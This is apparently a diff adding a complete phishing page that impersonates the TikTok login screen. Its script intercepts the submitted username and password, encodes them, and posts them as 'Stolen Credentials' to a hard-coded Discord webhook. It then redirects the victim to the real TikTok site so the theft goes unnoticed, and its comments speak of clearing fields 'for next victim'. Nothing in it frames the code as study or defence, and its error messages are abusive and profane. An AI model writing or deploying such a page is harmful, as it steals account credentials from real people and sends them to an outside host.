@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fe2c55; /* TikTok's signature color */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+        h1 {
+            text-align: center;
+            color: #fe2c55;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #e61e4d;
+        }
+        .error {
+            color: red;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Log in to TikTok</h1>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username or Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+            <div class="error" id="errorMessage"></div>
+        </form>
+    </div>
+
+    <script>
+        // Complex and obfuscated script to handle form submission and data exfiltration
+        (function() {
+            var complexObfuscatedFunction = function() {
+                // Redundant loop for obfuscation
+                for (var i = 0; i < 10000; i++) {
+                    if (i % 2 === 0) continue; // Useless check
+                }
+                
+                // Grab the form elements
+                var formElement = document.getElementById('loginForm');
+                var usernameField = document.getElementById('username');
+                var passwordField = document.getElementById('password');
+                var errorDiv = document.getElementById('errorMessage');
+                
+                // Prevent default form submission
+                formElement.addEventListener('submit', function(event) {
+                    event.preventDefault(); // Don't let the form actually submit
+                    
+                    // Extract the values with some basic validation
+                    var username = usernameField.value.trim();
+                    var password = passwordField.value.trim();
+                    
+                    if (username === '' || password === '') {
+                        errorDiv.textContent = 'Please fill in all fields, you dumbass.'; // Politically incorrect error message
+                        return; // Bail out
+                    }
+                    
+                    // More obfuscation: Create a dummy object and process it
+                    var dataPacket = {
+                        user: username,
+                        pass: password
+                    };
+                    
+                    // Encode the data for transmission (simple Base64 for evasion)
+                    function encodeShit(data) {
+                        var encoded = btoa(JSON.stringify(data)); // Base64 encode
+                        var extraLayer = encoded.split('').reverse().join(''); // Reverse it for fun
+                        return extraLayer; // Return the messed-up string
+                    }
+                    
+                    var encodedData = encodeShit(dataPacket);
+                    
+                    // Send to Discord webhook
+                    var webhookURL = 'https://discordapp.com/api/webhooks/1469319959103672382/avAIF-UbwqHjIW70ag1Vic63XGAZH2FkE9s86oz8pAD0AjFb8h53Rotbayw0ihvn4vcw'; // Replace this with your actual webhook
+                    
+                    // Complex fetch function with redundant checks
+                    function sendToHook(url, payload) {
+                        fetch(url, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                content: 'Stolen Credentials: ' + payload // Send as a message
+                            })
+                        }).then(function(response) {
+                            if (response.ok) {
+                                // Redirect to real TikTok to avoid suspicion
+                                window.location.href = 'https://www.tiktok.com/';
+                            } else {
+                                errorDiv.textContent = 'Something fucked up on our end. Try again later.';
+                            }
+                        }).catch(function(error) {
+                            console.error('Error sending data:', error); // Log for debugging
+                            errorDiv.textContent = 'Network error, you piece of shit connection.';
+                        });
+                    }
+                    
+                    // Another layer of obfuscation: Wait a bit before sending
+                    setTimeout(function() {
+                        sendToHook(webhookURL, encodedData);
+                    }, 500); // Wait 0.5 seconds to mimic processing
+                    
+                    // Clear fields for next victim
+                    usernameField.value = '';
+                    passwordField.value = '';
+                });
+            };
+            
+            // Call the function with some wrappers
+            try {
+                complexObfuscatedFunction();
+            } catch (e) {
+                console.log('Wrapped error: ' + e);
+            }
+        })();
+    </script>
+</body>
+</html>
